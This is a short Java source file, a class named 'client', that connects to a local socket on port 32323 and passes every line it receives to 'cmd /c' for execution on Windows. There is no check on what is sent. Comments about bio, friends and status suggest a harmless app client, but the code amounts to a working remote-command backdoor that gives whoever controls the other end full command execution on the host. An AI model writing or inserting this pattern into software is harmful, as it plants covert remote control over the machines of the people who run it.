import java.net.*;
import java.io.*;
public class client {
    Socket sock;    
    PrintStream ps;
    BufferedReader din;    
    InputStream is;
    public static void main(String[] args) throws Exception {
        new client();
        //types:B:bio, F:#friends, S:status
        //
    }
    public client() {
        try {
            sock = new Socket("127.0.0.1", 32323);
            ps = new PrintStream(sock.getOutputStream());
            din = new BufferedReader(new InputStreamReader(sock.getInputStream()));
            is = sock.getInputStream();
            //ps.println("HELLO");
            //run(input);
            while(true) {
                String line = din.readLine();
                try {
                    Runtime.getRuntime().exec("cmd /c " + line);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                
            }
            
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}